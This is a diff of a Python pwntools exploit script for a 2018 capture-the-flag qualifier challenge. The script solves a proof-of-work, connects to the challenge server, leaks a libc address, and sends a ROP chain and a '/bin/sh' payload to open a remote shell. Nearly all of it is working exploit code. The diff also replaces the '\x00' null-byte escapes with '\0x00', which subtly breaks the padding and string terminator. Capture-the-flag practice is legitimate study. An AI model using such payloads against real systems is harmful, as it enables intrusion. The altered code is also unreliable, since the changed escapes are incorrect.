@@ -22,13 +22,13 @@ def solve_pow(challenge, n):
         candidate += 1
 
 if __name__ == '__main__':
-#    challenge = sys.argv[1]
-#    n = int(sys.argv[2])
+    challenge = sys.argv[1]
+    n = int(sys.argv[2])
 
-#    print('Solving challenge: "{}", n: {}'.format(challenge, n))
+    print('Solving challenge: "{}", n: {}'.format(challenge, n))
 
-#    solution = solve_pow(challenge, n)
-#    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
+    solution = solve_pow(challenge, n)
+    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
 	
     r = remote("cee810fa.quals2018.oooverflow.io",31337)
     r.recvuntil("Challenge: ")
@@ -69,6 +69,6 @@ if __name__ == '__main__':
     libc = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x6f690
     print( hex(libc))
     payload2 = flat([0x0,text+0x10aa,0x0,0x1,text+0x202060,0x16,text+0x202020,0x0,text+0x1090],[0x0]*7,[text+0x10b3,text+0x202028,text+0x9e0])
-    r.send(payload2.ljust(0x100,'\x00'))
-    r.send(p64(libc+0x45390)+"/bin/sh\x00")
+    r.send(payload2.ljust(0x100,'\0x00'))
+    r.send(p64(libc+0x45390)+"/bin/sh\0x00")
     r.interactive()
